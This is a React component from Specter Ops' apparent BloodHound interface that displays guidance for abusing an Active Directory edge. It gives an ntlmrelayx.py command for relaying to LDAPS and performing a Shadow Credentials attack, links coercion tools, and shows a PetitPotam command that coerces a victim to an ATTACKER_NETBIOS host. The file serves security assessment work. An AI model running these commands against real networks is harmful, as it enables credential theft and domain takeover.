// Copyright 2025 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Link, Typography } from '@mui/material';
import { FC } from 'react';
import CodeController from '../CodeController/CodeController';

const LinuxAbuse: FC = () => {
    return (
        <>
            <Typography variant={'body1'}>1. Start the Relay Server</Typography>
            <Typography variant={'body2'}>
                The NTLM relay can be executed with{' '}
                <a href={'https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py'}>ntlmrelayx.py</a>. To
                relay to LDAP and perform a Shadow Credentials attack against the target computer:
                <CodeController>
                    {'ntlmrelayx.py -t ldaps://<Domain Controller IP> --shadow-credentials'}
                </CodeController>
            </Typography>

            <Typography variant={'body1'}>2. Coerce the Target Computer</Typography>
            <Typography variant={'body2'}>
                Several coercion methods are documented here:{' '}
                <Link
                    target='_blank'
                    rel='noopener'
                    href='https://github.com/p0dalirius/windows-coerced-authentication-methods'>
                    Windows Coerced Authentication Methods
                </Link>
                . Examples of tools include:
                <ul>
                    <li>
                        <Link target='_blank' rel='noopener' href='https://github.com/p0dalirius/Coercer'>
                            Coercer.py
                        </Link>
                    </li>
                    <li>
                        <Link
                            target='_blank'
                            rel='noopener'
                            href='https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py'>
                            printerbug.py
                        </Link>
                    </li>
                    <li>
                        <Link target='_blank' rel='noopener' href='https://github.com/topotam/PetitPotam'>
                            PetitPotam
                        </Link>
                    </li>
                </ul>
            </Typography>
            <Typography variant={'body2'}>
                To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
                Connection String format: <code>\\SERVER_NETBIOS@PORT/PATH/TO/FILE</code>. Example:
            </Typography>
            <Typography component={'pre'}>
                {'Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS@PORT/file.txt" "VICTIM_IP"'}
            </Typography>
        </>
    );
};

export default LinuxAbuse;
